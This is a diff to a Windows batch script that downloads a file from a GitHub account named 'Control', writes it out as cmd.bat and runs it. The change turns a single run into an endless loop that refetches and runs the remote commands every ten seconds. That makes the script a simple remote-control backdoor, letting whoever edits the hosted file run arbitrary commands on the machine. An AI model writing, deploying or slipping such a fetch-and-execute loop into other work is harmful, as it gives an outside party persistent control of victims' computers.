@@ -1,4 +1,4 @@
-@echo off && cd C:\users\%username%\AppData
+cd C:\users\%username%\AppData
 :begin
 Set "url=https://raw.githubusercontent.com/Guest257351/Control/main/REPtxt.bat"
 for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
@@ -7,8 +7,9 @@ If exist "%File%" (
     ( Type "%File%")>con
 ( Type "%File%" >cmd.bat)
 )
-cmd.bat
-Pause>nul & Exit
+call cmd.bat
+timeout 10 /NOBREAK >nul
+goto begin
 
 
 :Download <url> <File>
